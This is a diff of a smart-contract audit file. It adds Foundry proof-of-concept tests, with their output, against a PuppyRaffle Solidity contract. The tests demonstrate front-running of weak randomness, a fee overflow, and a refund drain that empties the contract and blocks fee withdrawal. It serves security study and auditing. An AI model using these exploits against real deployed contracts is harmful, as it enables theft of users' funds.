@@ -425,7 +425,7 @@ function testVariablesCanBeSetAsConstantsCauseExcessiveDeploymentCost() public {
     191477
     ```
 
-###
+### testUnIndexedEventsMakeOffChainToolsLivesHard
 
 - input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
 
@@ -906,6 +906,282 @@ Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 902.24µs (225.24µ
 Ran 1 test suite in 4.66ms (902.24µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
 ```
 
+### testWinnerIndexAndRaritySelectionMechanisVulnerableToFrontrunAttack
+
+- Input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testWinnerIndexAndRaritySelectionMechanisVulnerableToFrontrunAttack() public {
+    // push players into raffle...
+    address[] memory newPlayers = new address[](4);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    // time travel to future...
+    vm.warp(block.timestamp + duration + 10);
+    vm.roll(block.number + 1);
+
+    // Attacker front-runs the winner selection mechanism
+    vm.startPrank(ATTACKER);
+    uint256 expectedWinnerIndex =
+        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % newPlayers.length;
+    puppyRaffle.selectWinner();
+    vm.stopPrank();
+
+    // Attacker got their desired winner with common puppy nft
+    // Although, Obviously, They can triage until they got their desired outcomes.
+
+    address expectedWinner = newPlayers[expectedWinnerIndex];
+    address actualWinner = puppyRaffle.previousWinner();
+    uint256 tokenIds = puppyRaffle.balanceOf(actualWinner);
+    uint256 tokenId;
+    if (tokenIds > 0) {
+        tokenId = puppyRaffle.tokenOfOwnerByIndex(actualWinner, tokenIds - 1);
+    }
+    string memory puppyNft = puppyRaffle.tokenURI(tokenId);
+
+    console2.log("expectedWinner: ", expectedWinner);
+    console2.log("actualWinner  : ", actualWinner);
+    console2.log("tokenId       : ", tokenId);
+    console2.log("tokenId       : ", tokenId);
+    console2.log("NFT           : ", puppyNft);
+
+    // Hence pwned!
+    assertEq(expectedWinner, actualWinner);
+
+    // @recommendations: Please use a better selection mechanism which is really a random choice RNG i.e.,
+    // chainlink is widely popular in web3 space.... head to that and have a try :)
+}
+```
+
+- Output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testWinnerIndexAndRaritySelectionMechanisVulnerableToFrontrunAttack() (gas: 338909)
+Logs:
+  expectedWinner:  0x0000000000000000000000000000000000000004
+  actualWinner  :  0x0000000000000000000000000000000000000004
+  tokenId       :  0
+  tokenId       :  0
+  NFT           :  data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.80ms (3.11ms CPU time)
+
+Ran 1 test suite in 66.92ms (9.80ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testAccountingDriftDueToPossibleWrapAroundToFeeLocalVarAndtotalFeeStateVar
+
+- Input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testAccountingDriftDueToPossibleWrapAroundToFeeLocalVarAndtotalFeeStateVar() public {
+    // push players into raffle...
+    address[] memory newPlayers = new address[](100);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    // time travel to future...
+    vm.warp(block.timestamp + duration + 10);
+    vm.roll(block.number + 1);
+
+    puppyRaffle.selectWinner();
+
+    uint256 expectedTotalFees = ((newPlayers.length * entranceFee) * 20) / 100;
+    uint256 actualTotalFees = puppyRaffle.totalFees();
+
+    console2.log("expectedTotalFees: ", expectedTotalFees);
+    console2.log("actualTotalFees  : ", actualTotalFees);
+
+    // drift in uint64(fee), local var fee
+    assertNotEq(expectedTotalFees, actualTotalFees);
+    assertGe(expectedTotalFees, actualTotalFees);
+
+    // let's prove the drift in totalFees
+    // now totalFees is: 1_553255926290448384
+
+    // let's simulate the raffle once again
+    address[] memory anotherPlayers = new address[](90);
+    for (uint256 i; i < anotherPlayers.length; i++) {
+        anotherPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: anotherPlayers.length * entranceFee}(anotherPlayers);
+
+    // time travel to future...
+    vm.warp(block.timestamp + duration + 10);
+    vm.roll(block.number + 1);
+
+    puppyRaffle.selectWinner();
+
+    expectedTotalFees = ((anotherPlayers.length * entranceFee) * 20) / 100;
+    // 18000000000000000000 + 1553255926290448384 = 19553255926290448384
+    actualTotalFees = puppyRaffle.totalFees();
+
+    console2.log("new expectedTotalFees: ", expectedTotalFees);
+    console2.log("new actualTotalFees  : ", actualTotalFees);
+
+    // this time we can see a clear drift in totalFees
+    // because 20% 90 ether is 18 ether and 18_000000000000000000 is smaller than type(uint64).max
+    assertNotEq(expectedTotalFees, actualTotalFees);
+    assertNotEq(actualTotalFees, 19553255926290448384);
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testAccountingDriftDueToPossibleWrapAroundToFeeLocalVarAndtotalFeeStateVar() (gas: 40574116)
+Logs:
+  expectedTotalFees:  20000000000000000000
+  actualTotalFees  :  1553255926290448384
+  new expectedTotalFees:  18000000000000000000
+  new actualTotalFees  :  1106511852580896768
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.94ms (8.18ms CPU time)
+
+Ran 1 test suite in 9.40ms (8.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testAttackersDontLetLegitimateUsersToWithdrawFee
+
+- Input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testAttackersDontLetLegitimateUsersToWithdrawFee() public {
+    address[] memory newPlayers = new address[](100);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    // time travel to future...
+    vm.warp(block.timestamp + duration + 10);
+    vm.roll(block.number + 1);
+
+    puppyRaffle.selectWinner();
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    Attacker attacker = new Attacker(address(puppyRaffle));
+    address[] memory attackerAsPlayer = new address[](1);
+    attackerAsPlayer[0] = address(attacker);
+
+    vm.deal(address(attacker), 1 ether);
+
+    vm.startPrank(address(attacker));
+    puppyRaffle.enterRaffle{value: attackerAsPlayer.length * entranceFee}(attackerAsPlayer);
+
+    uint256 attackerBalanceBeforeAttack = address(attacker).balance;
+    uint256 raffleBalanceBeforeAttack = address(puppyRaffle).balance;
+    uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
+
+    // Attacker front-runs this transaction...
+    // vm.startPrank(puppyRaffle.owner());
+    // puppyRaffle.withdrawFees();
+    // vm.stopPrank();
+
+    puppyRaffle.refund(attackerIndex);
+
+    uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+    uint256 attackerBalanceAfterAttack = address(attacker).balance;
+    vm.stopPrank();
+
+    console2.log("attackerBalanceBeforeAttack: ", attackerBalanceBeforeAttack);
+    console2.log("attackerBalanceAfterAttack : ", attackerBalanceAfterAttack);
+    console2.log("raffleBalanceBeforeAttack  : ", raffleBalanceBeforeAttack);
+    console2.log("raffleBalanceAfterAttack   : ", raffleBalanceAfterAttack);
+
+    uint256 totalFees = puppyRaffle.totalFees();
+    console2.log("totalFee: ", totalFees);
+
+    // now when legitmate users transaction executes...
+    // Guesss what?
+    // exception occurs: PuppyRaffle: There are currently players active!
+    // raffle balance is 0 and totalFees is something greater than zero.
+    vm.startPrank(puppyRaffle.owner());
+    vm.expectRevert();
+    puppyRaffle.withdrawFees();
+    vm.stopPrank();
+}
+```
+
+- Output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testAttackersDontLetLegitimateUsersToWithdrawFee() (gas: 103245585)
+Logs:
+  attackerBalanceBeforeAttack:  0
+  attackerBalanceAfterAttack :  121000000000000000000
+  raffleBalanceBeforeAttack  :  121000000000000000000
+  raffleBalanceAfterAttack   :  0
+  totalFee:  1553255926290448384
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.99ms (21.35ms CPU time)
+
+Ran 1 test suite in 22.43ms (21.99ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### dEaD fUnCtIoN
+
+```solidity
+// @Note: dEaD fUnCtIoN
+function _isActivePlayer() internal view returns (bool) {
+    // @BUG: Finding active player in a Big players array is dangerous
+    // @danger: Gas exhaustion revert the lookup therefore DoS occurs
+    for (uint256 i = 0; i < players.length; i++) {
+        if (players[i] == msg.sender) {
+            return true;
+        }
+    }
+    return false;
+}
+```
+
+### No Update Function `raffleDuration`
+
+```solidity
+@> uint256 public raffleDuration;
+
+// only initialized in constructor...
+constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+    //...
+
+@>  raffleDuration = _raffleDuration;
+
+    //...
+}
+```
+
+- Note: So, It should be either an immutable or have an update function.
+- Having an update function would be feasible.
+
+### `entranceFee` should not be an immutable
+
+```solidity
+@>   uint256 public immutable entranceFee;
+```
+
+- Note: Lottery lacks future plans, policy changes.
 
 
 
